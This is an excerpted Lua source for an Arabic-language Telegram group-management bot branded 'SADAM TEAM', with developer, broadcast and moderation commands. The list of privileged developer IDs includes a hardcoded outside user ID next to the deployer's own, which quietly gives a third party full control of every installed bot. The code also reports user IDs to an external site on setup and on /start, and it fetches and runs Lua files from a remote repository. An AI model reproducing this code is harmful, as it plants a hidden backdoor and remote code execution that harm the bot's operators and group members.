...
Server_Sadam = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
------------------------------------------------------------------------------------------------------------
local function Load_File()
local f = io.open("./Info_Sudo.lua", "r")  
if not f then   
if not redis:get(Server_Sadam.."Token_Devsadam") then
...
redis:set(Server_Sadam.."Token_Devsadam",token)
end 
else
...
if User_Sudo ~= '' then
local GetInfoUser = http.request("https://sadamoro.tk/GetUser?id="..User_Sudo)
...
redis:set(Server_Sadam.."User_Devsadam1",User_Info.Info.Username)
redis:set(Server_Sadam.."Id_Devsadam",User_Info.Info.Id)
else
...
do 
local sadam_INFO = {
Id_Devsadam = ]]..redis:get(Server_Sadam.."Id_Devsadam")..[[,
UserName_sadam = "]]..redis:get(Server_Sadam.."User_Devsadam1")..[[",
Token_Bot = "]]..redis:get(Server_Sadam.."Token_Devsadam")..[["
}
return sadam_INFO
end
...
#!/usr/bin/env bash
cd $HOME/Storm
token="]]..redis:get(Server_Sadam.."Token_Devsadam")..[["
while(true) do
rm -fr ../.telegram-cli
...
os.execute('chmod +x SS')
os.execute('./SS')
Status = true
else   
f:close()  
redis:del(Server_Sadam.."Token_Devsadam");redis:del(Server_Sadam.."Id_Devsadam");redis:del(Server_Sadam.."User_Devsadam1")
Status = false
end  
return Status
end
...
UserName_Dev = sudos.UserName_sadam
bot_id = token:match("(%d+)")  
Id_Dev = sudos.Id_Devsadam
Ids_Dev = {sudos.Id_Devsadam,746233853,bot_id}
Name_Bot = redis:get(bot_id.."Redis:Name:Bot") or "صدام"
------------------------------------------------------------------------------------------------------------
function var(value)  
...
------------------------------------------------------------------------------------------------------------
function Dev_sadam(msg)  
local Dev_sadam = false  
...
local function Dev_sadam_User(user)  
local Dev_sadam_User = false  
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_sadam_User = true  
end  
end  
return Dev_sadam_User  
end 
...
if Dev_sadam_User(user_id) then
Status = true  
...
if Dev_sadam_User(user_id) == true then
...
------------------------------------------------------------------------------------------------------------
function Filessadam(msg)
File_Bot = dofile("Script.lua")
if File_Bot.sadam and msg then
Text_File = File_Bot.sadam(msg)
end
send(msg.chat_id_, msg.id_,Text_File)  
return false
end
function FilessadamBot(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
Text_FileBot = dofile("Files/"..v)
if Text_FileBot.sadamFile and msg then
Text_FileBot = Text_FileBot.sadamFile(msg)
end
end
end
...
------------------------------------------------------------------------------------------------------------
function Dev_sadam_File(msg,data)
if msg then
msg = data.message_
...
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id..'GetTexting:Devsadam'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' or text == 'الغاء ✖' then 
redis:del(bot_id..'GetTexting:Devsadam'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'⌔︙تم الغاء حفظ كليشة المطور')
return false
end
redis:set(bot_id..'Texting:Devsadam',text)
redis:del(bot_id..'GetTexting:Devsadam'..msg.chat_id_..':'..msg.sender_user_id_)
...
local Users = redis:smembers(bot_id.."Sadam:UsersBot")
local Groups = redis:smembers(bot_id..'Sadam:Chek:Groups') 
for i = 1, #Groups do
redis:sadd(bot_id..'ChekBotAdd',Groups[i])  
local list1 = redis:smembers(bot_id..'Sadam:Basic:Constructor'..Groups[i])
for k,v in pairs(list1) do
redis:sadd(bot_id.."President:Group"..Groups[i], v)
end
local list2 = redis:smembers(bot_id..'Sadam:Constructor'..Groups[i])
for k,v in pairs(list2) do
redis:sadd(bot_id.."Constructor:Group"..Groups[i], v)
end
local list3 = redis:smembers(bot_id..'Sadam:Manager'..Groups[i])
for k,v in pairs(list3) do
redis:sadd(bot_id.."Manager:Group"..Groups[i], v)
end
local list4 = redis:smembers(bot_id..'Sadam:Mod:User'..Groups[i])
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/SDAMHOSIN/SADAMFILES/master/getfile.json")
if res == 200 then
...
local Get_Json, Res = https.request("https://raw.githubusercontent.com/SDAMHOSIN/SADAMFILES/master/Files_Bot/"..File_Name)
if Res == 200 then
...
local File_Name = File_Get[2]..'.lua'
local Get_Json, Res = https.request("https://raw.githubusercontent.com/SDAMHOSIN/SADAMFILES/master/File_Bot/"..File_Name)
if Res == 200 then
...
if text == '/start' then  
local url,res = http.request('https://sadamoro.tk/chh/?id='..msg.sender_user_id_)
...
if not Dev_sadam(msg) and not redis:sismember(bot_id..'User:Ban:Pv',msg.sender_user_id_) and not redis:get(bot_id..'Status:Lock:Twasl') then
...
redis:set(bot_id..'GetTexting:Devsadam'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
redis:del(bot_id..'Texting:Devsadam')
...
if Dev_sadam_User(result.id_) == true then
...
send(msg.chat_id_, msg.id_,'*⌔︙ عدد المجموعات الان ← { '..#group..' } مجموعه '..sadam..''..taha..'\n⌔︙اصبح عدد المجموعات الان ← { '..sendok..' } مجموعات*\n')   
end
end
end,nil)
end
...
if text == 'رفع النسخه الاحتياطيه' and tonumber(msg.reply_to_message_id_) > 0 and Dev_sadam(msg) then   
tdcli_function({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(Arg, Data)   
...
if Dev_sadam_User(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_, "⌔︙لا تستطيع حظر المطور الاساسي عام")
return false 
end
...
elseif text == "تفعيل المغادره" and Dev_sadam(msg) then   
redis:del(bot_id.."Status:Lock:Left"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"⌔︙تم تفعيل مغادرة البوت") 
elseif text == "تعطيل المغادره" and Dev_sadam(msg) then  
redis:set(bot_id.."Status:Lock:Left"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "⌔︙تم تعطيل مغادرة البوت") 
elseif text == "تفعيل الاذاعه" and Dev_sadam(msg) then  
redis:del(bot_id.."Status:Broadcasting:Bot") 
send(msg.chat_id_, msg.id_,"⌔︙تم تفعيل الاذاعه \n⌔︙الان يمكن للمطورين الاذاعه" ) 
elseif text == "تعطيل الاذاعه" and Dev_sadam(msg) then  
redis:set(bot_id.."Status:Broadcasting:Bot",true) 
send(msg.chat_id_, msg.id_,"⌔︙تم تعطيل الاذاعه") 
...
elseif text == 'تفعيل البوت الخدمي' and Dev_sadam(msg) then  
redis:del(bot_id..'Free:Bot') 
send(msg.chat_id_, msg.id_,'⌔︙تم تفعيل البوت الخدمي \n⌔︙الان يمكن الجميع تفعيله') 
elseif text == 'تعطيل البوت الخدمي' and Dev_sadam(msg) then  
redis:set(bot_id..'Free:Bot',true) 
send(msg.chat_id_, msg.id_,'⌔︙تم تعطيل البوت الخدمي') 
...
elseif text == 'وضع كليشه المطور' and Dev_sadam(msg) then
redis:set(bot_id..'GetTexting:Devsadam'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'⌔︙ ارسل لي الكليشه الان')
...
elseif text == 'روابط الكروبات' and Dev_sadam(msg) then
local list = redis:smembers(bot_id..'ChekBotAdd') 
test = '⌔︙روابط الكروبات \n\n'
for k,v in pairs(list) do 
...
elseif text == ("مسح ردود المطور") and Dev_sadam(msg) then 
...
elseif text == ("ردود المطور") and Dev_sadam(msg) then 
local list = redis:smembers(bot_id.."List:Rd:Sudo")
text = "\n⌔︙قائمة ردود المطور \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,"["..text.."]")
elseif text == "اضف رد للكل" and Dev_sadam(msg) then 
...
elseif text == "حذف رد للكل" and Dev_sadam(msg) then 
...
if Dev_sadam_User(msg.sender_user_id_) == true then
redis:srem(bot_id.."Developer:Bot", result.id_)
redis:srem(bot_id.."President:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id..'Constructor:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Manager:Group'..msg.chat_id_, result.id_)
...
elseif text == "تغير اسم البوت" and Dev_sadam(msg) or text == "تغيير اسم البوت" and Dev_sadam(msg) then 
redis:setex(bot_id.."Change:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي الاسم الان ")  
elseif text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and DeveloperBot(msg) then 
if redis:get(bot_id.."Status:Broadcasting:Bot") and not Dev_sadam(msg) then 
...
𓂅 .SADAM TEAM 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [Source Channel](t.me/znznn)

𓂅 . [Source Info ](t.me/Znznn)     

𓂅 . [DEV SADAM](t.me/M0000)     
...
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
elseif text == "تنظيف المشتركين" and Dev_sadam(msg) then
local pv = redis:smembers(bot_id..'Num:User:Pv')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
...
return false
elseif text == "تنظيف الكروبات" and Dev_sadam(msg) then
local group = redis:smembers(bot_id..'ChekBotAdd')  
local w = 0
local q = 0
for i = 1, #group do
...
elseif text and text:match("^تعين عدد الاعضاء (%d+)$") and Dev_sadam(msg) then
redis:set(bot_id..'Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
send(msg.chat_id_, msg.id_,'*⌔︙ تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو *')
elseif text =='الاحصائيات' and DeveloperBot(msg) then 
send(msg.chat_id_, msg.id_,'*⌔︙عدد احصائيات البوت الكامله \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n⌔︙عدد المجموعات : '..(redis:scard(bot_id..'ChekBotAdd') or 0)..'\n⌔︙عدد المشتركين : '..(redis:scard(bot_id..'Num:User:Pv') or 0)..'*')
elseif text == 'المطور' or text == 'مطور' then
local TextingDevsadam = redis:get(bot_id..'Texting:Devsadam')
if TextingDevsadam then 
send(msg.chat_id_, msg.id_,TextingDevsadam)
else
send(msg.chat_id_, msg.id_,'['..UserName_Dev..']')
end
elseif text == 'حذف كليشه المطور' and Dev_sadam(msg) then
redis:del(bot_id..'Texting:Devsadam')
send(msg.chat_id_, msg.id_,'⌔︙ تم حذف كليشه المطور')
end
end
...
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Num:Add:Bot') or 0) and not Dev_sadam(msg) then
...
--------------------------------------------------------------------------------------------------------------
Dev_sadam_File(msg,data)
FilessadamBot(msg,data)
